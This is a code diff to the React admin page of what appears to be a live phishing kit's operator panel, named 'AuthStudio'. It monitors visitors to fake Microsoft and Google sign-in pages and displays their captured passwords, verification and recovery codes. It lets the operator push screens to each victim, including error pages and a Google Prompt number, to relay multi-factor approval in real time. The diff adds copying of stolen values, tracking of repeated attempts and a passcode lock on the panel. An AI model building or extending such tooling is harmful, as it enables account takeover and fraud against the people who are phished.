@@ -1,5 +1,5 @@
 import { useState, useEffect, useRef } from 'react';
-import { Monitor, Smartphone, Tablet, Moon, Sun, Key, Lock, Mail, LayoutList, Eye, X, Database, Trash2, Loader2, Menu } from 'lucide-react';
+import { Monitor, Smartphone, Tablet, Moon, Sun, Key, Lock, Mail, LayoutList, Eye, X, Database, Trash2, Loader2, Menu, Copy, Shield, AlertCircle } from 'lucide-react';
 
 const MicrosoftLogo = () => (
   <svg width="16" height="16" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
@@ -266,7 +266,7 @@ function ConfirmActionModal({
 }) {
   const [loaded, setLoaded] = useState(false);
   const base = import.meta.env.BASE_URL.replace(/\/$/, '');
-  const src = `${base}/?provider=${visitor.provider}&device=desktop&theme=light&initialStep=${step}`;
+  const src = `${base}/?provider=${visitor.provider}&device=desktop&theme=light&initialStep=${step}&viewOnly=1`;
   return (
     <div className="absolute inset-0 z-[100] flex items-end sm:items-center justify-center" style={{ backgroundColor: 'rgba(0,0,0,0.78)', backdropFilter: 'blur(5px)' }}>
       <div className="w-full sm:max-w-[480px] sm:mx-6 bg-[#13151a] border border-[#2d3139] rounded-t-2xl sm:rounded-2xl shadow-2xl overflow-hidden flex flex-col" style={{ maxHeight: '90vh' }}>
@@ -332,12 +332,14 @@ function VisitorModal({
   const [codeTypeSelected, setCodeTypeSelected] = useState<'email' | 'phone'>('email');
   const [authenticatorDialogOpen, setAuthenticatorDialogOpen] = useState(false);
   const [authenticatorNumberVal, setAuthenticatorNumberVal] = useState('');
+  const [promptNavDialogOpen, setPromptNavDialogOpen] = useState(false);
+  const [promptNavVal, setPromptNavVal] = useState('');
 
   const iframeSrc = visitorModalSrc(visitor);
   const stepColor = STEP_COLORS[visitor.step] ?? '#4b5563';
   const stepLabel = STEP_LABELS[visitor.step] ?? visitor.step;
   const formEntries = Object.entries(visitor.formData ?? {});
-  const formHistory = [...(visitor.formHistory ?? [])].reverse();
+  const formHistory = [...(visitor.formHistory ?? [])].reverse().filter(e => e.field !== 'cookies');
   const isSensitive = (field: string) => ['password','reg_password','email_code','rec_code','reg_verify_code','phone_code','verification_code'].includes(field);
   const ua = parseUA(visitor.userAgent);
 
@@ -351,8 +353,13 @@ function VisitorModal({
       setPhoneCodeDialogOpen(true);
       return;
     }
-    // Error and immediate steps — send without preview confirmation
-    if (step === 'gmail-done' || step === 'error-email' || step === 'error-password' || step === 'error-code') {
+    if (step === 'prompt-number' && visitor.provider === 'google') {
+      setPromptNavVal('');
+      setPromptNavDialogOpen(true);
+      return;
+    }
+    // Immediate steps — send without preview confirmation
+    if (step === 'gmail-done' || step === 'processing' || step === 'error-email' || step === 'error-password' || step === 'error-code') {
       onPushAction(visitor.id, step, extra);
       return;
     }
@@ -456,7 +463,12 @@ function VisitorModal({
             {/* Navigate */}
             <div className="p-5 border-b border-[#2d3139]">
               <p className="text-[9px] font-bold uppercase tracking-[0.12em] text-[#555d6b] mb-3">Navigate</p>
-              <div className="space-y-1.5">
+              {!visitor.online && (
+                <div className="mb-3 px-3 py-2 rounded-lg bg-red-500/10 border border-red-500/30 text-[11px] text-red-400 font-medium">
+                  Visitor offline — actions will not be delivered
+                </div>
+              )}
+              <div className={`space-y-1.5 ${!visitor.online ? 'opacity-40 pointer-events-none' : ''}`}>
                 {(PROVIDER_PUSH_STEPS[visitor.provider] ?? PROVIDER_PUSH_STEPS.microsoft).map(({ label, step, color }) => (
                   <button
                     key={step}
@@ -481,6 +493,26 @@ function VisitorModal({
                     <button onClick={() => setPhoneCodeDialogOpen(false)} className="flex-1 py-2 rounded-lg border border-[#2d3139] text-[12px] text-[#8a919e] hover:bg-[#2d3139] transition-colors">Cancel</button>
                     <button onClick={() => { if (phoneDigitsVal.length >= 1) { onPushAction(visitor.id, 'phone-code', { phoneDigits: phoneDigitsVal }); setPhoneCodeDialogOpen(false); } }}
                       className="flex-1 py-2 rounded-lg text-[12px] font-semibold text-white" style={{ backgroundColor: '#b45309' }}>Send</button>
+                  </div>
+                </div>
+              )}
+
+              {/* Google Prompt number dialog — inline in Navigate */}
+              {promptNavDialogOpen && visitor.provider === 'google' && (
+                <div className="mt-3 bg-[#1a1d24] rounded-xl border border-[#4285F4]/50 p-4 space-y-3">
+                  <p className="text-[11px] text-[#8a919e] font-medium">Number to show on the Google Prompt screen</p>
+                  <input
+                    type="number" min={1} max={99} value={promptNavVal}
+                    onChange={e => setPromptNavVal(e.target.value)} placeholder="e.g. 45"
+                    className="w-full bg-[#0b0c10] border border-[#2d3139] rounded-lg px-3 py-2 text-[13px] text-white placeholder-[#555d6b] outline-none focus:border-[#4285F4] transition-colors"
+                    autoFocus
+                  />
+                  <div className="flex gap-2">
+                    <button onClick={() => setPromptNavDialogOpen(false)} className="flex-1 py-2 rounded-lg border border-[#2d3139] text-[12px] text-[#8a919e] hover:bg-[#2d3139] transition-colors">Cancel</button>
+                    <button
+                      onClick={() => { const n = parseInt(promptNavVal, 10); if (n >= 1 && n <= 99) { onPushAction(visitor.id, 'prompt-number', { promptNumber: n }); setPromptNavDialogOpen(false); } }}
+                      className="flex-1 py-2 rounded-lg text-[12px] font-semibold text-white" style={{ backgroundColor: '#4285F4' }}
+                    >Send</button>
                   </div>
                 </div>
               )}
@@ -533,7 +565,7 @@ function VisitorModal({
 
               {/* Google Prompt controls */}
               {visitor.provider === 'google' && (
-                <div className="mt-4 space-y-3">
+                <div className={`mt-4 space-y-3 ${!visitor.online ? 'opacity-40 pointer-events-none' : ''}`}>
                   <p className="text-[9px] font-bold uppercase tracking-[0.12em] text-[#555d6b]">Prompt</p>
                   <div className="space-y-1.5">
                     {[
@@ -590,7 +622,7 @@ function VisitorModal({
             {/* Simulate */}
             <div className="p-5 border-b border-[#2d3139]">
               <p className="text-[9px] font-bold uppercase tracking-[0.12em] text-[#555d6b] mb-3">Simulate</p>
-              <div className="space-y-1.5">
+              <div className={`space-y-1.5 ${!visitor.online ? 'opacity-40 pointer-events-none' : ''}`}>
                 {PROVIDER_ERROR_STEPS.map(({ label, step, color }) => (
                   <button
                     key={step}
@@ -632,38 +664,57 @@ function VisitorModal({
                 </div>
               ) : (
                 <div className="space-y-2">
-                  {formHistory.map((entry, idx) => {
-                    const { field, value, ts } = entry;
-                    const sensitive = isSensitive(field);
-                    const revealKey = `${field}-${idx}`;
-                    const revealed = revealField === revealKey;
-                    return (
-                      <div key={idx} className="bg-[#1a1d24] rounded-xl border border-[#2d3139] overflow-hidden group">
-                        <div className="flex items-center justify-between px-3 pt-2.5 pb-1">
-                          <div className="flex items-center gap-2 min-w-0">
-                            <span className="text-[9px] text-[#555d6b] uppercase font-bold tracking-widest flex-shrink-0">{FIELD_LABELS[field] ?? field}</span>
-                            <span className="text-[9px] text-[#3e4450] flex-shrink-0">{new Date(ts).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}</span>
-                          </div>
-                          <div className="flex items-center gap-1.5 flex-shrink-0">
-                            {sensitive && (
-                              <button onClick={() => setRevealField(revealed ? null : revealKey)} className="text-[9px] font-semibold text-amber-500 hover:text-amber-300 transition-colors uppercase tracking-wide">
-                                {revealed ? 'hide' : 'show'}
+                  {(() => {
+                    const fieldTotal: Record<string, number> = {};
+                    formHistory.forEach(e => { fieldTotal[e.field] = (fieldTotal[e.field] ?? 0) + 1; });
+                    const fieldCounts: Record<string, number> = {};
+                    return formHistory.map((entry, idx) => {
+                      const { field, value, ts } = entry;
+                      fieldCounts[field] = (fieldCounts[field] ?? 0) + 1;
+                      const total = fieldTotal[field];
+                      const attemptNum = total - fieldCounts[field] + 1;
+                      const isLatest = attemptNum === total;
+                      const isRepeated = total > 1;
+                      const sensitive = isSensitive(field);
+                      const revealKey = `${field}-${idx}`;
+                      const revealed = revealField === revealKey;
+                      return (
+                        <div key={idx} className={`rounded-xl border overflow-hidden group ${isRepeated && !isLatest ? 'bg-[#13151a] border-[#232630] opacity-75' : 'bg-[#1a1d24] border-[#2d3139]'}`}>
+                          <div className="flex items-center justify-between px-3 pt-2.5 pb-1">
+                            <div className="flex items-center gap-1.5 min-w-0">
+                              <span className="text-[9px] text-[#555d6b] uppercase font-bold tracking-widest flex-shrink-0">{FIELD_LABELS[field] ?? field}</span>
+                              {isRepeated && (
+                                <span className={`text-[8px] font-bold px-1.5 py-0.5 rounded-full leading-none flex-shrink-0 ${isLatest ? 'bg-amber-400/15 text-amber-400' : 'bg-[#1e2128] text-[#3e4450]'}`}>
+                                  {isLatest ? '★ latest' : `#${attemptNum}`}
+                                </span>
+                              )}
+                              <span className="text-[9px] text-[#3e4450] flex-shrink-0">{new Date(ts).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}</span>
+                            </div>
+                            <div className="flex items-center gap-1.5 flex-shrink-0">
+                              <button onClick={() => { navigator.clipboard?.writeText(value).catch(() => {}); }}
+                                className="w-4 h-4 flex items-center justify-center rounded text-[#3e4450] hover:text-blue-400 transition-colors opacity-0 group-hover:opacity-100" title="Copy">
+                                <Copy className="w-2.5 h-2.5" />
                               </button>
-                            )}
-                            <button onClick={() => onDeleteField(visitor.id, field)}
-                              className="w-4 h-4 flex items-center justify-center rounded hover:bg-red-900/40 text-[#3e4450] hover:text-red-400 transition-colors opacity-0 group-hover:opacity-100" title={`Delete all ${field} entries`}>
-                              <X className="w-2.5 h-2.5" />
-                            </button>
+                              {sensitive && (
+                                <button onClick={() => setRevealField(revealed ? null : revealKey)} className="text-[9px] font-semibold text-amber-500 hover:text-amber-300 transition-colors uppercase tracking-wide">
+                                  {revealed ? 'hide' : 'show'}
+                                </button>
+                              )}
+                              <button onClick={() => onDeleteField(visitor.id, field)}
+                                className="w-4 h-4 flex items-center justify-center rounded hover:bg-red-900/40 text-[#3e4450] hover:text-red-400 transition-colors opacity-0 group-hover:opacity-100" title="Delete">
+                                <X className="w-2.5 h-2.5" />
+                              </button>
+                            </div>
+                          </div>
+                          <div className="px-3 pb-3 pt-0.5">
+                            <span className="text-[13px] font-mono break-all" style={{ color: sensitive && !revealed ? '#6b7280' : sensitive ? '#f87171' : '#e2e8f0' }}>
+                              {sensitive && !revealed ? '•'.repeat(Math.min(value.length, 12)) : value}
+                            </span>
                           </div>
                         </div>
-                        <div className="px-3 pb-3 pt-0.5">
-                          <span className="text-[13px] font-mono break-all" style={{ color: sensitive && !revealed ? '#6b7280' : sensitive ? '#f87171' : '#e2e8f0' }}>
-                            {sensitive && !revealed ? '•'.repeat(Math.min(value.length, 12)) : value}
-                          </span>
-                        </div>
-                      </div>
-                    );
-                  })}
+                      );
+                    });
+                  })()}
 
                   {/* Session info */}
                   <div className="mt-4 pt-4 border-t border-[#2d3139] space-y-2">
@@ -709,6 +760,39 @@ export default function AdminPage() {
   const [windowWidth, setWindowWidth] = useState(typeof window !== 'undefined' ? window.innerWidth : 1200);
   const wsRef = useRef<WebSocket | null>(null);
 
+  // ── Auth / passcode gate ──────────────────────────────────────────────────────
+  const [authState, setAuthState] = useState<'loading' | 'gate' | 'verified'>('loading');
+  const [passcodeInput, setPasscodeInput] = useState('');
+  const [passcodeError, setPasscodeError] = useState<string | null>(null);
+  const passcodeRef = useRef('');
+
+  useEffect(() => {
+    const base = (import.meta as { env: { BASE_URL: string } }).env.BASE_URL.replace(/\/$/, '');
+    fetch(`${base}/api/admin-config`)
+      .then(r => r.json() as Promise<{ passcodeRequired: boolean }>)
+      .then(cfg => {
+        if (!cfg.passcodeRequired) {
+          passcodeRef.current = '';
+          setAuthState('verified');
+        } else {
+          const stored = sessionStorage.getItem('admin_passcode');
+          if (stored) { passcodeRef.current = stored; setAuthState('verified'); }
+          else setAuthState('gate');
+        }
+      })
+      .catch(() => setAuthState('gate'));
+  }, []);
+
+  const submitPasscode = (e?: React.FormEvent) => {
+    e?.preventDefault();
+    const val = passcodeInput.trim();
+    if (!val) return;
+    setPasscodeError(null);
+    passcodeRef.current = val;
+    sessionStorage.setItem('admin_passcode', val);
+    setAuthState('verified');
+  };
+
   useEffect(() => {
     const onResize = () => { setWindowWidth(window.innerWidth); };
     window.addEventListener('resize', onResize);
@@ -718,6 +802,7 @@ export default function AdminPage() {
   const isMobileAdmin = windowWidth < 768;
 
   useEffect(() => {
+    if (authState !== 'verified') return;
     let ws: WebSocket | undefined;
     try {
       const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
@@ -725,7 +810,7 @@ export default function AdminPage() {
       wsRef.current = ws;
 
       ws.onopen = () => {
-        ws!.send(JSON.stringify({ type: 'register-admin' }));
+        ws!.send(JSON.stringify({ type: 'register-admin', passcode: passcodeRef.current }));
       };
 
       ws.onmessage = (e: MessageEvent<string>) => {
@@ -742,7 +827,17 @@ export default function AdminPage() {
             field?: string;
             value?: string;
             ts?: number;
+            message?: string;
           };
+
+          if (msg.type === 'auth-error') {
+            sessionStorage.removeItem('admin_passcode');
+            setPasscodeError('Incorrect passcode — try again');
+            setPasscodeInput('');
+            setAuthState('gate');
+            ws?.close();
+            return;
+          }
 
           if (msg.type === 'visitors' && msg.visitors) {
             setVisitors(msg.visitors.map(v => ({ ...v, formData: v.formData ?? {}, formHistory: v.formHistory ?? [], online: true })));
@@ -790,7 +885,7 @@ export default function AdminPage() {
     } catch { /* ignore */ }
 
     return () => { try { ws?.close(); } catch { /* ignore */ } };
-  }, []);
+  }, [authState]);
 
   const pushAction = (visitorId: string, navigate: string, extra?: { promptNumber?: number; phoneDigits?: string }) => {
     const ws = wsRef.current;
@@ -833,6 +928,53 @@ export default function AdminPage() {
   };
 
   const modalVisitor = visitors.find(v => v.ip === modalVisitorIp) ?? null;
+
+  if (authState === 'loading') {
+    return (
+      <div className="w-screen h-screen bg-[#0b0c10] flex items-center justify-center">
+        <Loader2 className="w-6 h-6 text-[#555d6b] animate-spin" />
+      </div>
+    );
+  }
+
+  if (authState === 'gate') {
+    return (
+      <div className="w-screen h-screen bg-[#0b0c10] flex items-center justify-center p-4">
+        <div className="w-full max-w-[340px]">
+          <div className="flex flex-col items-center mb-8">
+            <div className="w-14 h-14 rounded-2xl bg-[#1a1d24] border border-[#2d3139] flex items-center justify-center mb-4 shadow-xl">
+              <Shield className="w-6 h-6 text-[#555d6b]" />
+            </div>
+            <h1 className="text-white text-[22px] font-bold tracking-tight">AuthStudio</h1>
+            <p className="text-[#555d6b] text-[13px] mt-1">Enter your passcode to access the panel</p>
+          </div>
+          <form onSubmit={submitPasscode} className="space-y-3">
+            <input
+              type="password"
+              value={passcodeInput}
+              onChange={e => { setPasscodeInput(e.target.value); setPasscodeError(null); }}
+              placeholder="••••••••"
+              autoFocus
+              className="w-full bg-[#1a1d24] border border-[#2d3139] rounded-xl px-4 py-3.5 text-white text-[16px] placeholder-[#3e4450] outline-none focus:border-[#3a3f4a] transition-colors text-center tracking-[0.3em]"
+            />
+            {passcodeError && (
+              <div className="flex items-center gap-2 text-red-400 text-[12px] justify-center py-1">
+                <AlertCircle className="w-3.5 h-3.5 flex-shrink-0" />
+                {passcodeError}
+              </div>
+            )}
+            <button
+              type="submit"
+              disabled={!passcodeInput.trim()}
+              className="w-full py-3.5 rounded-xl bg-white text-black text-[14px] font-semibold disabled:opacity-25 disabled:cursor-not-allowed hover:bg-gray-100 active:scale-[0.98] transition-all"
+            >
+              Unlock
+            </button>
+          </form>
+        </div>
+      </div>
+    );
+  }
 
   const providers: { id: Provider; name: string; icon: React.ReactNode }[] = [
     { id: 'microsoft', name: 'Microsoft', icon: <MicrosoftLogoLg /> },
